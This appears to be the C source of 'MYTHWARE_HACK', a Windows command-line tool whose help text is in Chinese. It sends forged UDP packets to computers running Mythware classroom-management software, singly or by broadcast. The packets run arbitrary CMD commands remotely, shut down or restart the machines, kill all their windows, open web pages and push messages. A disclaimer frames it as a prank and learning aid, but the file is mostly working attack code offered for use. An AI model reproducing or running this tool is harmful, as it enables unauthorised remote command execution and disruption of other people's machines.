
/*   COPYRIGHT (C) L1BERTYEVIL 2025   */
/* THIS PROGRAM WORKS ON WINDOWS ONLY */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include "mythware_hack.h"

/* MSVC使用以下语句，gcc编译需加参数-lws2_32 */
#ifdef _MSC_VER
#pragma comment(lib, "ws2_32.lib") 
#endif

/* 字符转小写 */
char ch_to_lower (char ch) { return (ch >= 'A' && ch <= 'Z') ? (ch + ('a' - 'A')) : ch; }

/* 字符串转小写 */
void str_to_lowercase (char *str) { for (; *str; str++) *str = ch_to_lower(*str); }

/* UTF-8转UTF-16LE, 返回值: 新分配的UTF-16LE字符串（wchar_t*），需要调用free释放 */
wchar_t* utf8_to_utf16le (const char* utf8_str) 
{
    if (!utf8_str) return NULL;
    int len = MultiByteToWideChar(CP_UTF8, 0, utf8_str, -1, NULL, 0);
    if (len == 0) return NULL;
    wchar_t* utf16_str = (wchar_t*)malloc(len * sizeof(wchar_t));
    if (!utf16_str) return NULL;
    if (MultiByteToWideChar(CP_UTF8, 0, utf8_str, -1, utf16_str, len) == 0) 
    {
        free(utf16_str);
        return NULL;
    }
    return utf16_str;
}

/* ANSI转UTF-16LE, 返回值: 新分配的UTF-16LE字符串（wchar_t*），需要调用free释放 */
wchar_t* ansi_to_utf16le (const char* ansi_str) 
{
    if (!ansi_str) return NULL;
    int len = MultiByteToWideChar(CP_ACP, 0, ansi_str, -1, NULL, 0);
    if (len == 0) return NULL;
    wchar_t* utf16_str = (wchar_t*)malloc(len * sizeof(wchar_t));
    if (!utf16_str) return NULL;
    if (MultiByteToWideChar(CP_ACP, 0, ansi_str, -1, utf16_str, len) == 0) 
    {
        free(utf16_str);
        return NULL;
    }
    return utf16_str;
}

/* 返回一个UTF-16LE宽字符串的全部字节数，包括结尾两个字节的0x00 */
size_t utf16le_arr_size (wchar_t* ws) { return (size_t)((wcslen(ws) + 1) * sizeof(wchar_t)); }

/* 利用 Windows API 封装的花里胡哨彩色printf */
int wprintfc (WORD color, const char* MSG, ...)
{
    /* 0. 保存默认颜色 */
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    WORD default_color = red|green|blue;
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    if (GetConsoleScreenBufferInfo(hConsole, &csbi)) default_color = csbi.wAttributes;

    /* 1. 设置输出颜色 */
    SetConsoleTextAttribute(hConsole, color);

    /* 2. 输出参数内容 */
    va_list args;
    va_start(args, MSG);
        int r = vprintf(MSG, args);
    va_end(args);

    /* 3. 恢复默认颜色 */
    SetConsoleTextAttribute(hConsole, default_color);
    return r;
}

/* 无参数时输出LOGO */
void finfo_logo ()
{
    for (int i=0; i<5; i++)
    {
        printf("%s\n", info_logo[i]);
    }
    printf("\n");
    wprintfc(blue|light,"[INFO] ");
    printf("欢迎使用");
    wprintfc(green|light,"MYTHWARE_HACK");
    printf("。\n");
    wprintfc(blue|light,"[INFO] ");
    printf("如需使用帮助请使用-h选项。\n");
}

/* 输出帮助信息 */
void finfo_help ()
{
    wprintfc(blue|light, "使用方法: \n");
    printf("  mwhack -i IPv4_addr [-p port] ([-m message] [-c command] [-b link] [-k])|([-s][-r])|[-q] [-v] \n");
    wprintfc(blue|light, "选项帮助: \n");
    printf("\t-h\t忽略其他选项, 显示帮助文本\n");
    printf("\t-v\t可与其他选项同时使用, 显示程序版本\n");
    printf("\t-i\t目标的IPv4地址(如需全体执行可使用广播地址)\n");
    printf("\t-p\t执行操作的目标端口号, 未指定则默认值4705\n");
    printf("\t-m\t发送指定的的消息内容\n");
    printf("\t-c\t远程执行指定的CMD命令\n");
    printf("\t-b\t使用浏览器打开指定的网页\n");
    printf("\t-k\t无参数, 关闭目标电脑正在运行的所有窗口\n");
    printf("\t-s\t使目标电脑关机\n");
    printf("\t-r\t使目标电脑重启\n");
    printf("\t-q\t发送签到命令, 弹出一个签到全屏窗口\n");
    wprintfc(blue|light, "其他说明: \n");
    printf("\t极域2021版本使用4988端口而不是默认值4705\n");
    printf("\t若指令无效可使用netstat -ano查看UDP协议下可能的端口号\n");
    printf("\t签到功能可能只会一闪而过, 且只能使用一次, 未知原因\n");
    wprintfc(red|green|red, "免责声明: \n");
    printf("\t此程序仅供整蛊娱乐和学习使用, 请使用者自行谨慎使用\n");
    printf("\t如造成任何损失及不良后果, 本程序作者不承担任何责任\n");
}

/* 输出版本信息 */
void finfo_vers ()
{
    wprintfc(blue|light, "版本信息: \n");
    printf("%s\n", info_ver);
    printf("%s\n", info_tim);
    printf("%s"  , info_cpr);
}

/* 参数解析辅助函数 */
int isStrPara (const char* str)
{
    if (
        strcmp(str,"-i")==0 ||
        strcmp(str,"-p")==0 ||
        strcmp(str,"-m")==0 ||
        strcmp(str,"-s")==0 ||
        strcmp(str,"-r")==0 ||
        strcmp(str,"-c")==0
    ) return 1;
    else if (strcmp(str,"-h")==0) return 2;
    else if (strcmp(str,"-v")==0) return 3;
    else if (str[0] == '-')       return 4;
    else return 0;
}

/* 参数解析第一步 */
/*
    返回值最低八位表示的意义, 第九位表示-v选项
    INDEX   15      14      13      12      11      10      9       8
    BIT     x       x       x       x       y       y       y       y
    MEANS                                           Brow    Kill    V

    返回值最低八位表示的意义, 第九位表示-v选项
    INDEX   7       6       5       4       3       2       1       0
    BIT     x       x       x       x       y       y       y       y
    MEANS   IP      PORT    M       S       R       C       Q       Help
*/
int arg_analyze_0 (int argc, char* argv[], char* cmdPIndexList)
{
    int ret_flags = 0;
    for (int i=1; i<argc; i++)
    {
        if (strcmp(argv[i], "-i") == 0) ret_flags |= 0x0080, (*(cmdPIndexList +7) = ((argc>i+1)?(i + 1):-1));    // -i   0000 1000 0000
        if (strcmp(argv[i], "-p") == 0) ret_flags |= 0x0040, (*(cmdPIndexList +6) = ((argc>i+1)?(i + 1):-1));    // -p   0000 0100 0000
        if (strcmp(argv[i], "-m") == 0) ret_flags |= 0x0020, (*(cmdPIndexList +5) = ((argc>i+1)?(i + 1):-1));    // -m   0000 0010 0000
        if (strcmp(argv[i], "-s") == 0) ret_flags |= 0x0010, (*(cmdPIndexList +4) = ((argc>i+1)?(i + 1):-1));    // -s   0000 0001 0000
        if (strcmp(argv[i], "-r") == 0) ret_flags |= 0x0008, (*(cmdPIndexList +3) = ((argc>i+1)?(i + 1):-1));    // -r   0000 0000 1000
        if (strcmp(argv[i], "-c") == 0) ret_flags |= 0x0004, (*(cmdPIndexList +2) = ((argc>i+1)?(i + 1):-1));    // -c   0000 0000 0100
        if (strcmp(argv[i], "-q") == 0) ret_flags |= 0x0002, (*(cmdPIndexList +1) = ((argc>i+1)?(i + 1):-1));    // -q   0000 0000 0010
        if (strcmp(argv[i], "-h") == 0) ret_flags |= 0x0001, (*(cmdPIndexList +0) = ((argc>i+1)?(i + 1):-1));    // -h   0000 0000 0001

        if (strcmp(argv[i], "-v") == 0) ret_flags |= 0x0100, (*(cmdPIndexList +8) = ((argc>i+1)?(i + 1):-1));    // -v   0001 0000 0000
        if (strcmp(argv[i], "-k") == 0) ret_flags |= 0x0200, (*(cmdPIndexList +9) = ((argc>i+1)?(i + 1):-1));    // -k   0010 0000 0000
        if (strcmp(argv[i], "-b") == 0) ret_flags |= 0x0400, (*(cmdPIndexList+10) = ((argc>i+1)?(i + 1):-1));    // -b   0100 0000 0000
    }
    return ret_flags;
}

/* 参数解析第二步 */
/*
    -1  -> 错误
    0   -> 输出信息，不执行任何操作
    1   -> 发送关机命令
    2   -> 发送重启命令
    3   -> 发送签到命令
    nF  -> 其他
*/
int arg_analyze_1 (int ana0, char* argv[], char* cmdPIndexList, addrInfo* Paddr)
{
    /* 0. 返回值 */
    int ret_value = 0;

    /* 1. 优先判断项 */
    // 如果没有指定除ip和端口外的任何选项
    if ((ana0 & 0x73f) == 0)
    {
        finfo_logo();
        return 0;
    }
    // 如果指定了-h选项
    else if (ana0 & 0x01)
    {
        finfo_help();
        if (ana0 & 0x100) finfo_vers();
        return 0;
    }
    // 如果有-p指定的端口号
    if (ana0 & 0x40) 
    {
        unsigned short port = (unsigned short)strtoul(argv[cmdPIndexList[6]], NULL, 10);
        if (port <= 1024 || port >= 65534)
        {
            wprintfc(red|light, "ERROR: ");
            printf("输入了非法的端口号，或指定了-p选项而没有输入端口号。\n");
            return -1;
        }
        else
        {
            Paddr -> sin_port = htons(port);
        }
    }

    /* 2. 其次判断项 */
    // 如果没有-i: -i是必须指定的选项
    if (((ana0 & 0x80) == 0) && ((ana0 & 0x63e) != 0))
    {
        wprintfc(red|light, "ERROR: ");
        printf("没有输入必选项IP地址。\n");
        ret_value = -1;
    }
    // 如果有-m、-c、-k、-b: -m、-c、-k、-b 和 -s、-r、-q不能共存
    else if ((ana0 & 0x20) || (ana0 & 0x04) || (ana0 & 0x200) || (ana0 & 0x400))
    {
        if ((ana0 & 0x10) || (ana0 & 0x08) || (ana0 & 0x02))
        {
            wprintfc(red|light, "ERROR: ");
            printf("-m、-c、-k、-b与-s、-r、-q不是可共存选项。\n");
            ret_value = -1;
        }
        else
        {
            // 用高四位来表示-m -c -k -b四个选项
            /*
                7   6   5   4   3   2   1   0
                x   x   x   x   1   1   1   1
                b   k   c   m
            */
            ret_value = 0x0f;
            // -m -c -k -b 存在一个或者同时存在其中几个
            if (ana0 & 0x20) 
            {
                if (cmdPIndexList[5] ==-1 || isStrPara(argv[cmdPIndexList[5]]))
                {
                    wprintfc(red|light, "ERROR: ");
                    printf("-m选项的参数出现问题。\n");
                    ret_value = -1;
                    goto RETIFV;
                }
                else ret_value |= 0x10;   //m
            }
            if (ana0 & 0x04) 
            {
                if (cmdPIndexList[2] ==-1 || isStrPara(argv[cmdPIndexList[2]]))
                {
                    wprintfc(red|light, "ERROR: ");
                    printf("-c选项的参数出现问题。\n");
                    ret_value = -1;
                    goto RETIFV;
                }
                else ret_value |= 0x20;   //c
            }
            if (ana0 & 0x200) 
            {
                if (cmdPIndexList[9] ==-1)
                {
                    wprintfc(red|light, "ERROR: ");
                    printf("-k选项出现问题。\n");
                    ret_value = -1;
                    goto RETIFV;
                }
                else ret_value |= 0x40;   //k
            }
            if (ana0 & 0x400) 
            {
                if (cmdPIndexList[10]==-1 || isStrPara(argv[cmdPIndexList[10]]))
                {
                    wprintfc(red|light, "ERROR: ");
                    printf("-b选项的参数出现问题。\n");
                    ret_value = -1;
                    goto RETIFV;
                }
                else ret_value |= 0x80;   //b
            }
        }
    }
    // 如果有-q: -q不能与-i、-p之外的其他选项共存
    else if (ana0 & 0x02)
    {
        if (ana0 & 0x3c)
        {
            wprintfc(red|light, "ERROR: ");
            printf("-q选项不能与除-i、-p之外的其他选项共存。\n");
            ret_value = -1;
        }
        else
        {
            ret_value = 3;
        }
    }
    // 如果没有-m、-c、-q选项: 除了-i只剩-s、-r或者都没有的情况
    else 
    {
        // 只有-s的情况
        if (ana0 & 0x10)
        {
            ret_value = 1;
        }
        // -s和-r共存 或者 只有-r的情况
        else if ((ana0 & 0x18)||(ana0 & 0x08))
        {
            ret_value = 2;
        }
        // 只有-i 或者 只有-i和-p的情况
        else
        {
            ret_value = -1;
        }
    }
    RETIFV:
    if (ana0 & 0x100) finfo_vers();
    Paddr -> sin_addr.s_addr  = inet_addr(argv[cmdPIndexList[7]]);
    return ret_value;
}

int main (int argc, char* argv[])
{
    /* 0. 设置程序使用UTF-8编码 */
    SetConsoleOutputCP(65001); // Output UTF-8
    SetConsoleCP(65001);       // Input  UTF-8

    /* 1. 初始化Winsock，创建UDPSocket */
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    SOCKET udp_socket = socket(AF_INET, SOCK_DGRAM,IPPROTO_UDP);
    if (udp_socket == INVALID_SOCKET) 
    {
        wprintfc(red|light, "ERROR: ");
        printf("创建Socket失败。\n");
        return 0;
    }

    /* 2. 设置默认端口号，创建其它变量 */
    addrInfo toAddr;
    addrInfo* paddr     = &toAddr;
    toAddr.sin_family   = AF_INET;
    toAddr.sin_port     = htons(4705);
    char cmdPIndexList[16];
    
    /* 3. 参数解析 */
    for (int i = 1; i < argc; i++) if (*(argv+i)[0]=='-') str_to_lowercase(argv[i]);
    int arg0 = arg_analyze_0(argc, argv, cmdPIndexList);
    int arg1 = arg_analyze_1(arg0, argv, cmdPIndexList, paddr);

    /* 4. 构造并发送数据包 */
    int size_sent = 0;
    switch (arg1)
    {
        case -1:
        case 0:
            goto ENDALL;
        case 1:
        // 关机
            size_sent = sendto(udp_socket, (const char*)h_off, sizeof(h_off), 0, (struct sockaddr*)paddr, sizeof(toAddr));
            break;
        case 2:
        // 重启
            size_sent = sendto(udp_socket, (const char*)h_rst, sizeof(h_rst), 0, (struct sockaddr*)paddr, sizeof(toAddr));
            break;
        case 3:
        // 签到
            size_sent = sendto(udp_socket, (const char*)h_sign, sizeof(h_sign), 0, (struct sockaddr*)paddr, sizeof(toAddr));
            break;
        default:
        //其他选项
            if (arg1 & 0x0f) 
            {
                if (arg1 & 0x10)
                {
                    wchar_t* textmsg = ansi_to_utf16le(argv[cmdPIndexList[5]]);
                    static char msgpack[954] = {0};
                    size_t msgsize = utf16le_arr_size(textmsg);
                    int ready_bytes = 0;
                    if (msgsize > 898) 
                    {
                        wprintfc(red|light, "ERROR: ");
                        printf("消息超长，不能发送。\n");
                        goto ENDALL;
                    }
                    for (int i = 0; i < 56; i++)
                    {
                        msgpack[i] = h_msg[i];
                        ready_bytes ++;
                    }
                    for (size_t i = 0; i < msgsize; i++)
                    {
                        msgpack[ready_bytes++] = *((char*)textmsg + i);
                    }
                    for (int i = 954 - ready_bytes; i > 0; i--)
                    {
                        msgpack[ready_bytes++] = 0x00;
                    }
                    free(textmsg);
                    size_sent += sendto(udp_socket, (const char*)msgpack, sizeof(msgpack), 0, (struct sockaddr*)paddr, sizeof(toAddr));
                }
                if (arg1 & 0x20)
                {
                    int ready_bytes = 0;
                    wchar_t* cmdbody = ansi_to_utf16le(argv[cmdPIndexList[2]]);
                    char cmdpack[906] = {0};
                    size_t Lbody = utf16le_arr_size(cmdbody);
                    if (Lbody + sizeof(h_cmd_0) > 894) 
                    {
                        wprintfc(red|light, "ERROR: ");
                        printf("命令超长，发送失败。\n");
                        break;
                    }
                    for (int i = 0; i < sizeof(h_cmd_0); i++)
                    {
                        cmdpack[i] = h_cmd_0[i];
                        ready_bytes ++;
                    }
                    for (size_t i = 0; i < Lbody; i++)
                    {
                        cmdpack[ready_bytes++] = *((char*)cmdbody + i);
                    }
                    for (int i = 906 - ready_bytes; i > 0; i--)
                    {
                        cmdpack[ready_bytes++] = 0x00;
                    }
                    free(cmdbody);
                    // cmdpack[896] = 0x01;
                    size_sent += sendto(udp_socket, (const char*)cmdpack, sizeof(cmdpack), 0, (struct sockaddr*)paddr, sizeof(toAddr));
                }
                if (arg1 & 0x40)
                {
                    size_sent += sendto(udp_socket, (const char*)h_kill, sizeof(h_kill), 0, (struct sockaddr*)paddr, sizeof(toAddr));
                }
                if (arg1 & 0x80)
                {
                    wchar_t* lnk = ansi_to_utf16le(argv[cmdPIndexList[10]]);
                    size_t lnkheadsize = sizeof(h_link);
                    size_t lnkbodysize = utf16le_arr_size(lnk);
                    size_t lnksize = lnkheadsize + lnkbodysize + 2;
                    int ready_bytes = 0;
                    char lnkpack[lnksize];
                    for (int i = 0; i < lnkheadsize; i++)
                    {
                        lnkpack[ready_bytes++] = h_link[i];
                    }
                    for (int i = 0; i < lnkheadsize; i++)
                    {
                        lnkpack[ready_bytes++] = *((char*)lnk + i);
                    }
                    lnkpack[ready_bytes++] = 0;
                    lnkpack[ready_bytes++] = 0;
                    free(lnk);
                    size_sent += sendto(udp_socket, (const char*)lnkpack, sizeof(lnkpack), 0, (struct sockaddr*)paddr, sizeof(toAddr));
                }
            }
            else goto ENDALL;
            break;
    }
    if (size_sent == SOCKET_ERROR)
    {
        wprintfc(red|light, "ERROR: ");
        printf("发送失败。\n");
    }
    else
    {
        wprintfc(green, "[DONE] ");
        printf("已成功发送%d字节数据。\n", size_sent);
    }

    /* 5.结束程序 */
    ENDALL:
    closesocket(udp_socket);
    WSACleanup();
    return 0;
}